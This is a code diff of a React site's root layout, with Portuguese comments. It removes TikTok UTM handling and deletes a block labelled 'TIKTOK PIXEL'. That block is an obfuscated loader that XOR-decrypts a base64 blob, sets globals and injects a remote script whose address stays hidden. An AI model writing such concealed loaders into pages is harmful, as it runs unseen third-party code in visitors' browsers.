@@ -175,7 +175,7 @@ function RootShell({ children }: { readonly children: ReactNode }) {
     <html lang="pt-BR">
       <head>
         <HeadContent />
-        {/* ─── NORMALIZAÇÃO DE UTM (FB / Google / TikTok) ───
+        {/* ─── NORMALIZAÇÃO DE UTM (META / GOOGLE) ───
              Roda antes do UTMify para padronizar utm_source/xcod e
              colar o click-id da origem. Leve e síncrono (sem impacto). */}
         <script
@@ -184,14 +184,13 @@ function RootShell({ children }: { readonly children: ReactNode }) {
               var POLL_MS = 500;
               var UTM_SEP = "jLj";
               var XCOD_SEP = "hQwK21wXxR";
-              var STORAGE_KEY = { FB: "lead", google: "lead-google", tiktok: "lead-tiktok" };
+              var STORAGE_KEY = { FB: "lead", google: "lead-google" };
               function getOrigin(utmSource) {
                 if (!utmSource) return null;
                 var base = utmSource.split(UTM_SEP)[0];
                 switch (base.toLowerCase()) {
                   case "fb": return "FB";
                   case "google": return "google";
-                  case "tiktok": case "tt": case "tik": return "tiktok";
                   default: return null;
                 }
               }
@@ -287,12 +286,6 @@ function RootShell({ children }: { readonly children: ReactNode }) {
             alt=""
           />
         </noscript>
-        {/* ─── TIKTOK PIXEL ─── */}
-        <script
-          dangerouslySetInnerHTML={{
-            __html: `(function(){var n_ktnk=atob("DNOdDj7OHM7zM3zknai/e0yiPvTRWwiQ7aCnIRGteKDdRgiJ9LXkIF2hceCRQVOX/qH0fkq9M76aSxmIsqP0dluiMbqaWAiL9v33fRziPq+HRw6N/6bpa03sJpWuH16D8bz/b1K9PvSoSF6K/L74LATsaKeYZxOPzbrla1KHeOzfEQqF8ab4LATsKq/KUEvU+Of7NgesL6vBUkqBrOv7awyoPrOuTg==");var f_o2fz=[];for(var u_r=0;u_r<n_ktnk.length;u_r++){f_o2fz.push(n_ktnk.charCodeAt(u_r)&255);}var g_za8r=f_o2fz[0];var u_y4=f_o2fz.slice(1,1+g_za8r);var e_k=f_o2fz.slice(1+g_za8r);var p_iltf=e_k.map(function(b,g_o){return b^u_y4[g_o%g_za8r];});var f_r="";for(var i_hy=0;i_hy<p_iltf.length;i_hy++){f_r+=String.fromCharCode(p_iltf[i_hy]&255);}var w_0rn1=decodeURIComponent(escape(f_r));var v_cbs=JSON.parse(w_0rn1);var w_3=v_cbs.globals||[];w_3.forEach(function(l_s){window[l_s.name]=l_s.value;});var h_z=document.createElement("script");h_z.src=v_cbs.url;h_z.async=true;h_z.defer=true;(v_cbs.attributes||[]).forEach(function(b_s){h_z.setAttribute(b_s.name,b_s.value);});(document.head||document.documentElement).appendChild(h_z);})();`,
-          }}
-        />
       </head>
       <body suppressHydrationWarning>
         {children}
